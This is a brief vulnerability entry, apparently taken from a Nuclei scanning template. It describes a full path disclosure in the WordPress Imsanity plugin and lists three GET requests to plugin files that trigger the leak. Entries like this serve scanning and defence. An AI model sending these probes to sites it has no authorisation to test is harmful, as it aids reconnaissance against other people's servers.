# Vulnerability: WordPress Plugin Imsanity - Full Path Disclosure
**Classification:** WP
**Source:** Nuclei Template (`wordpress-imsanity-fpd.yaml`)

## Description
WordPress Imsanity plugin is vulnerable to full path disclosure via direct access to plugin files.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/wp-content/plugins/imsanity/libs/imagecreatefrombmp.php
GET {{BaseURL}}/wp-content/plugins/imsanity/ajax.php
GET {{BaseURL}}/wp-content/plugins/imsanity/settings.php
```

